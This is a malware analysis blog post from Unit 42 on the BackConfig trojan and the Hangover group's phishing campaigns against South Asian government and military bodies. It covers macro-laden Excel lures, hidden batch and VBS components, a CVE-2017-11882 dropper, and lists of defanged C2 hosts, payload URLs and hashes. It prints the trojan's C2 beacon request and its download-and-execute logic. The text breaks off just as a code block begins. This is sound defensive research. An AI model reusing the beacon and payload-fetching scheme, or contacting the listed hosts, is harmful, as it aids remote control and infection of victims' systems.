              <img width="900" height="450" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2-900x450.png" class="attachment-single size-single" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2-900x450.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2-300x150.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2-768x384.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2-1024x512.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2-370x185.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2.png 2001w" sizes="(max-width: 900px) 100vw, 900px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/updated-backconfig-malware-targeting-government-and-military-organizations/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja"></span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><h2>Executive Summary</h2>
<p>Unit 42 has observed activity over the last 4 months involving the <a href="https://ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china-en/">BackConfig</a> malware used by the Hangover threat group (aka Neon, Viceroy Tiger, MONSOON). Targets of the spear-phishing attacks, using local and topical lures, included government and military organizations in South Asia.</p>
<p>The BackConfig custom trojan has a flexible plug-in architecture for components offering various features, including the ability to gather system and keylog information and to upload and execute additional payloads.</p>
<p>The initial infection occurs via a weaponized Microsoft Excel (XLS) document delivered via compromised legitimate websites for which the URLs are most likely shared via email. The documents use Visual Basic for Applications (VBA) Macro code which, if enabled by the victim, starts an installation process consisting of multiple components that result in the plug-in loader payload being downloaded and executed. The modular nature certainly allows for quicker changes to individual components and, perhaps more importantly for the attackers, splits up the malicious behaviors in such a way that could thwart sandbox and dynamic analysis systems, especially when analyzing the components in isolation.</p>
<p>Our <a href="https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention">threat prevention</a> platform with <a href="https://www.paloaltonetworks.com/products/secure-the-network/wildfire">WildFire</a> detects activity associated with this threat group, while simultaneously updating the malware category within the PAN-DB <a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security">URL filtering</a> solution for malicious and/or compromised domains that have been identified.</p>
<p>Indicators of compromise related to this research are documented at the end of this report and in the Adversary Playbook for the Hangover threat group that can be accessed in the <a href="https://pan-unit42.github.io/playbook_viewer/?pb=hangover">Unit 42 Playbook Viewer</a>.</p>
<h4>Starting Point</h4>
<p>Unit 42 first saw activity involving the Windows PE executable file (SHA256: <span style="font-family: 'courier new', courier, monospace;">84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c</span>) when searching AutoFocus data related to particular sectors and countries of interest.</p>
<p>The file was first seen on January 19th, 2020, having been downloaded by two organizations &#8212; a government department in one country and a military organization in another &#8212; within minutes of each other. The source of the download was <span style="font-family: 'courier new', courier, monospace;">http://212.114.52[.]148/request/httpsrequest</span> and the file <span style="font-family: 'courier new', courier, monospace;">httpsrequest</span> was stored locally as <span style="font-family: 'courier new', courier, monospace;">dphc.exe.</span> More details on how the malware was delivered are described later in the blog.</p>
<p>The choice of terminology in URL paths and file names when delivering BackConfig malware in this, and other campaigns discussed later on, is clearly to blend in as benign operations, paths and filenames. Although spelled differently, it could be easy to believe the payload relates to the DHCP networking service.</p>
<p>The purpose of this malware is to allow the actors to download and execute an executable file, as well as download and run batch files to run commands on the end system.</p>
<p>This sample has a custom &#8220;decryption&#8221; routine that subtracts six from each character. The following strings are decrypted using this method:</p>
<ul>
<li style="list-style-type: none;">
<ul style="list-style-type: disc;">
<li><span style="font-family: 'courier new', courier, monospace;">linkrequest[.]live</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">\\Adobe\\Driver\\dwg\\pid.txt</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">\\Adobe\\Driver\\dwg\\</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">\\Adobe\\Driver\\dwg\\wuaupdt.exe</span></li>
</ul>
</li>
</ul>
<p>The Trojan reads the following file to use in the URL of the C2 beacon. If the file does not exist, the executable will exit without performing any further activities. The <span style="font-family: 'courier new', courier, monospace;">pid.txt</span> file is created during the earlier delivery and installation phases starting with the weaponized Excel document. More information about this setup process is covered later in the delivery section. As previously mentioned, this behavior makes an automated analysis of the individual executable payload component harder.</p>
<ul>
<li style="list-style-type: none;">
<ul style="list-style-type: disc;">
<li><span style="font-family: 'courier new', courier, monospace;">%USERPROFILE%\Adobe\Driver\dwg\pid.txt</span></li>
</ul>
</li>
</ul>
<p>The C2 channel uses HTTPS thanks to the INTERNET_FLAG_SECURE flag used when calling the HttpOpenRequestA function. The beacon HTTP request will look like the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">GET /orderme/<strong>[contents of pid.txt file]</strong> HTTP/1.1</span><br />
<span style="font-family: 'courier new', courier, monospace;">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 @/NEW</span><br />
<span style="font-family: 'courier new', courier, monospace;">Host: linkrequest[.]live <strong>[resolving to 23.106.123[.]87]</strong></span></p>
<p>The Trojan will look for the following field and values within the HTTP response header:</p>
<ul>
<li style="list-style-type: none;">
<ul style="list-style-type: disc;">
<li><span style="font-family: 'courier new', courier, monospace;">&#8220;Content-Type: application&#8221;</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">&#8220;Content-Type: xDvsds&#8221;</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">&#8220;Content-Type: Bw11eW&#8221;</span></li>
</ul>
</li>
</ul>
<p>If the content-type field contains a value of <span style="font-family: 'courier new', courier, monospace;">application</span>, the Trojan will extract a filename from the HTTP response headers between the string filename and <span style="font-family: 'courier new', courier, monospace;">Content-Transfer-Encoding</span>. It will use this <span style="font-family: 'courier new', courier, monospace;">filename</span> to create a file in the <span style="font-family: 'courier new', courier, monospace;">%USERPROFILE%\Adobe\Driver\dwg\</span> folder, which it will write the data in the HTTP response to. Based on the other two <span style="font-family: 'courier new', courier, monospace;">Content-Types</span>, we believe the filename provided will be either &#8220;<span style="font-family: 'courier new', courier, monospace;">wuaupdt.exe</span>&#8221; or <span style="font-family: 'courier new', courier, monospace;">test.bat</span>.</p>
<p>If the content-type field has a value of <span style="font-family: 'courier new', courier, monospace;">xDvsds</span>, the Trojan will attempt to execute the following file using ShellExecuteA and the &#8220;open&#8221; method:</p>
<p><span style="font-family: 'courier new', courier, monospace;">%USERPROFILE%\Adobe\Driver\dwg\wuaupdt.exe</span></p>
<p>If the content-type field has a value of <span style="font-family: 'courier new', courier, monospace;">Bw11eW</span>, the Trojan will attempt to execute the following file using ShellExecuteA and the &#8220;open&#8221; method:</p>
<p><span style="font-family: 'courier new', courier, monospace;">%USERPROFILE%\Adobe\Driver\dwg\test.bat</span></p>
<p>At the time of writing, the C2 appeared inoperational and no further payloads were seen. We believe that the resultant <span style="font-family: 'courier new', courier, monospace;">wuaupdt.exe</span> file would then provide further capabilities to steal information, log keystrokes, and provide the ability to run additional commands either directly or via additional plugins which it would download, as documented by the Qihoo 360 Threat Intelligence group in their investigation of prior campaigns <a href="https://ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china-en/">here</a>.</p>
<p>Unit 42 has conducted cursory binary diffing for many of the BackConfig executable files and did not find any non-library function overlaps that would suggest that the payloads are based on the YTY or EHDev frameworks as mentioned <a href="https://www.netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia">here</a> and <a href="https://labs.bitdefender.com/2017/09/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/">here</a>.</p>
<h4>PE Metadata</h4>
<p>The malware sample contains some interesting static artifacts including self-signed digital certificates used to sign the executable purporting to be software from the Foxit Software Incorporated company based in California. It is not known why the actors picked this company &#8212; and others listed in Table 1 below &#8212; to impersonate but, as previously mentioned, their use of filenames and URLs makes their payloads appear benign and trustworthy.</p>
<p>Using this meta-data, together with information gleaned from infrastructure investigation, Unit 42 were able to pivot around on AutoFocus data to find additional BackConfig PE executable samples. Those samples from the last 12 months are listed in Tables 1 and 2 below.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 75.2778px;"><strong>SHA256</strong></td>
<td style="width: 202.685px;"><strong>Compilation Time (UTC)</strong></td>
<td style="width: 175.278px;"><strong>First Seen (Pacific)</strong></td>
<td style="width: 199.722px;"><strong>Signer Name</strong></td>
</tr>
<tr>
<td style="width: 75.2778px;"><span style="font-family: 'courier new', courier, monospace;">84e5629&#8230;</span></td>
<td style="width: 202.685px;">01/20/2020 7:26:09am</td>
<td style="width: 175.278px;">01/19/2020 11:49:03pm</td>
<td style="width: 199.722px;" rowspan="2">Foxit Software Incorporated</td>
</tr>
<tr>
<td style="width: 75.2778px;"><span style="font-family: 'courier new', courier, monospace;">18ce3ee&#8230;</span></td>
<td style="width: 202.685px;">10/10/2019 9:22:11am</td>
<td style="width: 175.278px;">01/16/2020 4:30:26pm</td>
</tr>
<tr>
<td style="width: 75.2778px;"><span style="font-family: 'courier new', courier, monospace;">4a4bc01&#8230;</span></td>
<td style="width: 202.685px;">11/21/2019 9:19:49am</td>
<td style="width: 175.278px;">01/16/2020 1:31:46am</td>
<td style="width: 199.722px;" rowspan="3">wind0ws</td>
</tr>
<tr>
<td style="width: 75.2778px;"><span style="font-family: 'courier new', courier, monospace;">91c67c1&#8230;</span></td>
<td style="width: 202.685px;">11/21/2019 9:19:49am</td>
<td style="width: 175.278px;">12/02/2019 2:03:41am</td>
</tr>
<tr>
<td style="width: 75.2778px;"><span style="font-family: 'courier new', courier, monospace;">de5b670&#8230;</span></td>
<td style="width: 202.685px;">11/21/2019 9:19:49am</td>
<td style="width: 175.278px;">11/21/2019 11:59:05pm</td>
</tr>
<tr>
<td style="width: 75.2778px;"><span style="font-family: 'courier new', courier, monospace;">f79ebf0&#8230;</span></td>
<td style="width: 202.685px;">10/28/2019 5:35:26am</td>
<td style="width: 175.278px;">11/09/2019 10:32:09pm</td>
<td style="width: 199.722px;">NVIDIA Corporation</td>
</tr>
<tr>
<td style="width: 75.2778px;"><span style="font-family: 'courier new', courier, monospace;">31faeef&#8230;</span></td>
<td style="width: 202.685px;">10/10/2019 9:22:11am</td>
<td style="width: 175.278px;">10/13/2019 10:11:04pm</td>
<td style="width: 199.722px;">Foxit Software Incorporated</td>
</tr>
<tr>
<td style="width: 75.2778px;"><span style="font-family: 'courier new', courier, monospace;">d87b875&#8230;</span></td>
<td style="width: 202.685px;">09/12/2019 5:54:04am</td>
<td style="width: 175.278px;">09/26/2019 9:32:19am</td>
<td style="width: 199.722px;">Digicert Global</td>
</tr>
<tr>
<td style="width: 75.2778px;"><span style="font-family: 'courier new', courier, monospace;">1510996&#8230;</span></td>
<td style="width: 202.685px;">12/05/2018 4:35:03am</td>
<td style="width: 175.278px;">04/09/2019 10:30:16am</td>
<td style="width: 199.722px;">Foxit Software Incorporated</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 1. Describing PE compile times and Digital signatures used, ordered by first seen.</em></span></p>
<p>The Compilation Time stored in executable (SHA256: <span style="font-family: 'courier new', courier, monospace;">84e5629</span>&#8230;) appears to be after the point at which the file was first seen by our WildFire analysis system. While the PE file timestamp could be modified post-compilation, the oddity is more likely explained away with time zones &#8212; 2349 Pacific time on the 19th is 1349 in Bangladesh on the 20th, and 7:26am UTC is in the range of 11:26 to 13:26 across the South Asia region, which would make the sample compilation quite recent with respect to the delivery of it.</p>
<p>More details about the self-signed digital certificates, as well as full hashes, can be found in the IOCs section at the end of this report.</p>
<p>The following table shows the version information from the same PE files, grouped by similar File Description fields. The order remains the same, except for the sample (SHA256: <span style="font-family: 'courier new', courier, monospace;">18ce3ee</span>&#8230;) which was first seen January 16th, 2020 but for some reason reverted to using exact version information seen in samples two to three months prior. Namely, <span style="font-family: 'courier new', courier, monospace;">Link Finder</span>.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 11.3636%;"><strong>SHA256</strong></td>
<td style="width: 15%;"><strong>File Description</strong></td>
<td style="width: 11.8182%;"><strong>File Version</strong></td>
<td style="width: 8.18184%;"><strong>Product Name</strong></td>
<td style="width: 13.6364%;"><strong>Product Version</strong></td>
<td style="width: 38.75%;"><strong>Copyright</strong></td>
</tr>
<tr>
<td style="width: 11.3636%;"><span style="font-family: 'courier new', courier, monospace;">84e5629&#8230;</span></td>
<td style="width: 15%;"> <strong>(Albert, in English)</strong></td>
<td style="width: 11.8182%;">06.10.2015</td>
<td style="width: 8.18184%;"></td>
<td style="width: 13.6364%;">01.05.2015</td>
<td style="width: 38.75%;">Copyright @ 2015-2026 secosec</td>
</tr>
<tr>
<td style="width: 11.3636%;"><span style="font-family: 'courier new', courier, monospace;">4a4bc01&#8230;</span></td>
<td style="width: 15%;" rowspan="3"></p>
<p><strong>(Link, in English)</strong></td>
<td style="width: 11.8182%;" rowspan="3">01.01.12</td>
<td style="width: 8.18184%;" rowspan="3"></td>
<td style="width: 13.6364%;" rowspan="3">10.01.2015</td>
<td style="width: 38.75%;" rowspan="3">Copyright @ 2011-2021 secosec Inc.   k <strong>(All rights reserved, in English)</strong></td>
</tr>
<tr>
<td style="width: 11.3636%;"><span style="font-family: 'courier new', courier, monospace;">91c67c1&#8230;</span></td>
</tr>
<tr>
<td style="width: 11.3636%;"><span style="font-family: 'courier new', courier, monospace;">de5b670&#8230;</span></td>
</tr>
<tr>
<td style="width: 11.3636%;"><span style="font-family: 'courier new', courier, monospace;">18ce3ee&#8230;</span></td>
<td style="width: 15%;" rowspan="3">Link Finder</td>
<td style="width: 11.8182%;" rowspan="3">01.01.12</td>
<td style="width: 8.18184%;" rowspan="3">Link Finder</td>
<td style="width: 13.6364%;" rowspan="3">13,9,1632</td>
<td style="width: 38.75%;" rowspan="3">Copyright @2011-2020 Techtest Inc. All Rights Reserved</td>
</tr>
<tr>
<td style="width: 11.3636%;"><span style="font-family: 'courier new', courier, monospace;">f79ebf0&#8230;</span></td>
</tr>
<tr>
<td style="width: 11.3636%;"><span style="font-family: 'courier new', courier, monospace;">31faeef&#8230;</span></td>
</tr>
<tr>
<td style="width: 11.3636%;"><span style="font-family: 'courier new', courier, monospace;">d87b875&#8230;</span></td>
<td style="width: 15%;">scrapper</td>
<td style="width: 11.8182%;">01.12.001</td>
<td style="width: 8.18184%;">scrapper</td>
<td style="width: 13.6364%;">13,6,1662</td>
<td style="width: 38.75%;">Copyright @Scrapper Ltd Reserved</td>
</tr>
<tr>
<td style="width: 11.3636%;"><span style="font-family: 'courier new', courier, monospace;">1510996&#8230;</span></td>
<td style="width: 15%;">system process</td>
<td style="width: 11.8182%;">2,1,1,2015</td>
<td style="width: 8.18184%;">system process cleaner</td>
<td style="width: 13.6364%;">2,1,1,2015</td>
<td style="width: 38.75%;">Copyright  2004-2018 Foxit Software Inc. All Rights Reserved</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 2. Describing PE version info metadata, ordered by first seen and grouped on matching data.</em></span></p>
<p>Of the set, the file (SHA256: <span style="font-family: 'courier new', courier, monospace;">1510996</span>&#8230;) has most consistency in terms of a theme, using the Foxit Copyright information, self-signed digital signature and even using the company logo, as shown in the Figure below, for the executable files icon. The files copyright information only differs from that of Foxits Reader software by a missing period symbol, implying it was copied rather than created.</p>
<p>The actors then moved to use seemingly fictitious company and product names while using a mixture of signer names in their digital signatures. No file icons were used at all over the last 11 months.</p>
<p>Recent samples also included Cyrillic text in the file description, product name, and copyright fields, as shown and translated in the table above. Its hard to know if this is an attempt to set false flags as to the origins of the BackConfig malware, or perhaps to make the content more relevant to specific targets within the victim organizations.</p>
<h4>Delivery and Installation</h4>
<p>In this section, we describe how the various payloads are delivered based on what we have seen in our customer networks, as well as what we have established through open-source research. Unit 42 has yet to see any evidence of weaponized documents used to deliver BackConfig being attached on phishing emails and that phishing URL links in emails appear to be the Hangover groups modus operandi.</p>
<p>The remainder of this section focuses largely on Object Linking and Embedding (OLE) Microsoft Excel documents, as they are most commonly used by the Hangover group, at least when it comes to the BackConfig malware. Through infrastructure analysis however, Unit 42 was able to find a BackConfig PE sample (SHA256: <span style="font-family: 'courier new', courier, monospace;">e28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f; first seen 10/24/2019</span>) using the C2 domain <span style="font-family: 'courier new', courier, monospace;">matissues[.]com</span> and dropped by the weaponised Rich Text Format (RTF) file (SHA256: <span style="font-family: 'courier new', courier, monospace;">752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f</span>) from the same day. The RTF used the <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882">CVE-2017-11882</a> exploit against equation editor vulnerabilities in Office applications to execute the PE sample which was a unique exploitation method compared to all other samples analyzed.</p>
<h4>Compromised Third-Party Infrastructure</h4>
<p>Continuing to pivot on data obtained from the samples found thus far, we discovered some related URLs relating to compromised third-party infrastructure supporting the delivery of the BackConfig malware. The following table lists some examples of compromised sites delivering weaponised XLS files with filenames, such as <span style="font-family: 'courier new', courier, monospace;">Circular_No_03.xls</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf</span>) and <span style="font-family: 'courier new', courier, monospace;">Circullar_Nov_2017.xls</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb</span>) implying (even with incorrect spelling) that the contents is, or relates to, a letter or advertisement which is distributed to a large number of people.</p>
<table style="width: 100%; height: 302px;">
<tbody>
<tr style="height: 46px;">
<td style="width: 11.3636%; height: 46px;"><strong>SHA-256</strong></td>
<td style="width: 14.6591%; height: 46px;"><strong>First Seen</strong></td>
<td style="width: 39.2046%; height: 46px;"><strong>Related URL</strong></td>
<td style="width: 23.8636%; height: 46px;"><strong>Description</strong></td>
<td style="width: 9.77273%; height: 46px;"><strong>Location</strong></td>
</tr>
<tr style="height: 118px;">
<td style="width: 11.3636%; height: 118px;"><span style="font-family: 'courier new', courier, monospace;">be3f12b&#8230;</span></td>
<td style="width: 14.6591%; height: 118px;">2019-10</td>
<td style="width: 39.2046%; height: 118px;"><span style="font-family: 'courier new', courier, monospace;">http://nsaimmigration[.]com/userfiles/image/</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">fbr.php</span> and <span style="font-family: 'courier new', courier, monospace;">nphp_registration_form.php <span style="font-family: georgia, palatino, serif;">(both HTTP 404)</span></span></td>
<td style="width: 23.8636%; height: 118px;">Consultant and Legal Advice company supporting students to live and study abroad.</td>
<td style="width: 9.77273%; height: 118px;">Pakistan</td>
</tr>
<tr style="height: 46px;">
<td style="width: 11.3636%; height: 46px;"><span style="font-family: 'courier new', courier, monospace;">0aa5cf1&#8230;</span></td>
<td style="width: 14.6591%; height: 46px;">2018-09</td>
<td style="width: 39.2046%; height: 46px;"><span style="font-family: 'courier new', courier, monospace;">http://webtechhub[.]com/wordpress/wp-content/images/fbr_circular.php</span></td>
<td style="width: 23.8636%; height: 46px;">Web design and dev site running outdated WordPress application</td>
<td style="width: 9.77273%; height: 46px;">Pakistan</td>
</tr>
<tr style="height: 46px;">
<td style="width: 11.3636%; height: 92px;" rowspan="2"><span style="font-family: 'courier new', courier, monospace;">ed638b5&#8230;</span></td>
<td style="width: 14.6591%; height: 92px;" rowspan="2">2017-11</td>
<td style="width: 39.2046%; height: 46px;"><span style="font-family: 'courier new', courier, monospace;">http://alphamike.com[.]mv/housing</span></td>
<td style="width: 23.8636%; height: 46px;">Shipping agency for freight forwarding and cargo delivery.</td>
<td style="width: 9.77273%; height: 46px;">Maldives</td>
</tr>
<tr style="height: 46px;">
<td style="width: 39.2046%; height: 46px;"><span style="font-family: 'courier new', courier, monospace;">http://mgamphs.edu[.]bd/info/ <span style="font-family: georgia, palatino, serif;">(down)</span></span></td>
<td style="width: 23.8636%; height: 46px;">Muhurigonj Academy of Music and Performance High School. <a href="https://twitter.com/malwrhunterteam/status/928619159306555392">Reference</a>.</td>
<td style="width: 9.77273%; height: 46px;">Bangladesh</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 3. Compromised third-party infrastructure to support delivery of BackConfig.</em></span></p>
<p>Given the targeting related to these threats, and the compromised third-party websites, we believe the use of fbr in some of the URLs above likely relates to the Federal Board of Revenue (FBR) government organization of Pakistan. The fbr theme also runs into the VBA macro code. File <span style="font-family: 'courier new', courier, monospace;">ed638b5</span>&#8230; contains the statement <span style="font-family: 'courier new', courier, monospace;">Const WelcomePage = &#8220;FBR&#8221;</span>.</p>
<p>The old compromised hosting examples in Table 3 above do not rely on Hypertext Preprocessor (PHP) server-side scripts to deliver the weaponized XLS files. Instead, the pages simply used HTTP response status 301 (Moved Permanently) for URL redirection to said XLS, initiating the download. More recent examples make use of PHP with URL filenames matching the social engineering theme, such as fbr. In addition, the actors use the PHP script to log any visitors to the page noting in a file named info.txt the datetime stamp of the event, the client operating system, and their IP address.</p>
<p>The location of the compromised third-party infrastructure or the organizations legitimately using them, align with the targeting Unit 42 has seen. This could be pure coincidence, a sign from the threat actors that their intention is to take advantage of weaknesses in the target countrys wider infrastructure, or the threat actors leveraging in-country infrastructure that may be considered more trustworthy by the intended victims and their security solutions.</p>
<p>Palo Alto Networks WildFire sandbox analyzed sample <span style="font-family: 'courier new', courier, monospace;">ed638b5</span>&#8230; on November 8th, 2017, and, as described in the table above, the sample was hosted on two compromised websites: a Bangladesh school and a Maldivan shipping agency. While Unit 42 has not seen Hangover activity in the Maldives, the archipelago is in the region alongside other known targets and interestingly, swore in a new President about a week after Unit 42 analyzed the sample.</p>
<p>The EXE payload (SHA256: <span style="font-family: 'courier new', courier, monospace;">4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd</span>) downloaded directly by the VBA code in sample <span style="font-family: 'courier new', courier, monospace;">ed638b5</span>&#8230; from the URL below relates to those documented by BitDefender <a href="https://labs.bitdefender.com/2017/09/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/">here</a>. To date, Unit 42 has only seen 6 similar samples since the late-2017 timeframe for this sample, compared to many more prior, perhaps indicating a change over of the custom payloads used by the Hangover group. Certainly, there are some overlaping Tactics Techniques and Procedures (TTPs) between the older samples and the more recent BackConfig samples.</p>
<p><span style="font-family: 'courier new', courier, monospace;">http://chancetowin.quezknal[.]net/appstore/updatepatch/logs.exe</span></p>
<h4>Evolution of Delivery Payloads</h4>
<p>Before moving on to describe the most recent samples and installation methods used by the Hangover actors, the timeline figure below provides a high-level view of the evolution in TTPs used.</p>
<figure id="attachment_107190" aria-describedby="caption-attachment-107190" style="width: 600px" class="wp-caption aligncenter"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-63.png" rel="wpdevart_lightbox"><img class="wp-image-107190" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-63.png" alt="" width="600" height="302" /></a><figcaption id="caption-attachment-107190" class="wp-caption-text">Figure 2. Evolution of delivery payloads</figcaption></figure>
<p>Despite the evolution over the years, some habits are hard to break. Firstly, every weaponized XLS Unit 42 has investigated loads a fake error message, such as the one shown in Figure 3 below, to trick the victim into thinking that the file is corrupt and thus nothing has &#8212; or will &#8212; load as intended. Another fictitious error message text has been used in the past often with poor spelling or grammar.</p>
<figure id="attachment_107192" aria-describedby="caption-attachment-107192" style="width: 600px" class="wp-caption aligncenter"><img class="wp-image-107192" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-64.png" alt="" width="600" height="250" /><figcaption id="caption-attachment-107192" class="wp-caption-text">Figure 3. Example fake error message displayed to the victim.</figcaption></figure>
<p>Similarly, the version information metadata stored in all the Excel documents analyzed share the same <span style="font-family: 'courier new', courier, monospace;">Author</span> and <span style="font-family: 'courier new', courier, monospace;">Last Modified By</span> names &#8211; <span style="font-family: 'courier new', courier, monospace;">Testing</span>.</p>
<p>The following subsections describe the campaigns and malware as highlighted by the three most recent milestones in the timeline figure above.</p>
<h4>2019 Milestone: Multi-Component</h4>
<p><span style="font-family: 'courier new', courier, monospace;">Registration Form.xls</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461</span>) listed in Table 3 above provides an example of the types of lures used by the threat actors.</p>
<p>Upon opening the XLS and enabling the macro code, the picture in Figure 4 below is shown on top white-background cells. As the filename suggests, its a registration form and relates to the Naya Pakistan Housing program run by the Pakistani government to help solve the housing shortfall in the country. Eligible citizens include government employees and registration forms were due by October 15th, 2019 (extended through November 15th), meaning the timing and the lure of the campaign on October 25th were clearly planned to increase the chances of compromise.</p>
<figure id="attachment_107194" aria-describedby="caption-attachment-107194" style="width: 600px" class="wp-caption aligncenter"><img class="wp-image-107194" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-65.png" alt="" width="600" height="719" /><figcaption id="caption-attachment-107194" class="wp-caption-text">Figure 4. Social engineering lure against Pakistan government in October 2019</figcaption></figure>
<p>As the PHP webpages did not exist at the time of writing, Unit 42 cannot prove the XLS file <span style="font-family: 'courier new', courier, monospace;">be3f12b</span>&#8230; was hosted at the URL listed in row 1 of Table 3 above. However, because of the following points, we have high confidence in the campaign relationship between the two.</p>
<ol>
<li style="list-style-type: none;">
<ol>
<li>AutoFocus and VirusTotal first processed the XLS file <span style="font-family: 'courier new', courier, monospace;">be3f12b</span>&#8230; on October 25th, 2019</li>
<li>VirusTotal processed the <span style="font-family: 'courier new', courier, monospace;">nsaimmigration</span>&#8230; URL on the same day</li>
<li>A specific HTTP GET request URL using the notation <span style="font-family: 'courier new', courier, monospace;">nphp_registration_form.php?r=</span> was processed in VirusTotal on the same day, and has relations to <span style="font-family: 'courier new', courier, monospace;">http://185.203.119[.]184/fin_div/session</span>, which matches the IP address and URL structure in the VBS code dropped by the XLS <span style="font-family: 'courier new', courier, monospace;">be3f12b</span>&#8230;.</li>
<li>The name of the PHP webpage <span style="font-family: 'courier new', courier, monospace;">nphp_registration_form.php</span> relates to the filename of the XLS.</li>
</ol>
</li>
</ol>
<p>The VBA macro code in the XLS file <span style="font-family: 'courier new', courier, monospace;">be3f12b</span>&#8230; differed somewhat from that of the samples of the previous years. Instead of directly storing encoded EXE files or running batch shell commands directly from the VBA code itself, it retrieved the content from hidden columns in the Excel sheet, starting at column 27 or AA, which is likely to be off-screen for most people. Once the font colour was changed, the setup batch code component as per previous variants, and the new Visual Basic Script (VBS) downloader component were revealed in columns AA and AB, respectively, as shown in figure 5 below.</p>
<figure id="attachment_107196" aria-describedby="caption-attachment-107196" style="width: 600px" class="wp-caption aligncenter"><img class="wp-image-107196" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-66.png" alt="" width="600" height="252" /><figcaption id="caption-attachment-107196" class="wp-caption-text">Figure 5. VBS downloader and BAT setup file revealed in the XLS sheet.</figcaption></figure>
<p>Macro VBA code in the XLS parses the content of the two columns line by line writing the contents to their respective files on disk and executing them following the same process flow as described below in Figure 6.</p>
<h4>2019 Milestone: BITS and ZIPs</h4>
<p>A more recent weaponized XLS file (SHA256: <span style="font-family: 'courier new', courier, monospace;">021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b</span>) was analyzed by WildFire on November 15th, 2019 and exposed some new techniques. On this occasion, the VBA macro code contained a decimal-encoded ZIP file of only 1,062 bytes in size. Inside the ZIP archive were two text files that would be decompressed to a folder <span style="font-family: 'courier new', courier, monospace;">driverkit</span>. One file, <span style="font-family: 'courier new', courier, monospace;">driverkit.bat</span>, is the setup BAT file already discussed in this report and listed in the appendix section. The other file, Winmgt.txt, is an adaptation of the VBS downloaded also described in this report. However, instead of a direct HTTP download using an MSXML DOM object, this version writes the following contents to <span style="font-family: 'courier new', courier, monospace;">Winmgt_Drive.bat</span>, which is executed by a third scheduled task created by the setup BAT file.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f6928a008c21732473798" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
